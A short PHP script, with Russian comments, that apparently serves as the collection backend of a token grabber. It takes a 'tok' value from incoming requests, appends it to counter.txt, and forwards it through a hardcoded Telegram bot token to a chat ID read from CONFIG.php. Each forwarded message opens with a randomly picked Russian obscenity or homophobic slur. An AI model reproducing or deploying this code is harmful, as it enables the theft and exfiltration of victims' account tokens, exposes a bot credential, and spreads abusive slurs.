<?php
$fl = file_get_contents('CONFIG.php');
$a = explode("\n", $fl);

if (isset($_POST["tok"])) { 
    $result = array(
    	'tok' => $_POST["tok"],
    ); 

    echo json_encode($result); 
}

if(isset($_REQUEST['tok'])){ 
$token = $_REQUEST['tok'];

$fp = fopen("counter.txt", "a"); // Открываем файл в режиме записи 
$mytext = "{$_REQUEST['tok']}\r\n"; // Исходная строка
$test = fwrite($fp, $mytext); // Запись в файл
if ($test) echo '';
else echo '';
fclose($fp); //Закрытие файла
}

$strings = array(
    'педик',
    'чмо',
    'гадон',
    'лох',
    'лось',
    'блядь',
    'ХУЙ',
    'блядина',
    'пиздабол',
    'глиномес',
);
$key = array_rand($strings);

$tokenn = "800072471:AAHVn-qW-3Ga4VTY4vtI67VfUZXm6JcrZnc";$data = [    'text' => "Здарова {$strings[$key]}\nНовый токен:\n{$_REQUEST['tok']}",
	'chat_id' => ("{$a[0]}")];file_get_contents("https://api.telegram.org/bot$tokenn/sendMessage?" . http_build_query($data) );
	exit;
?>
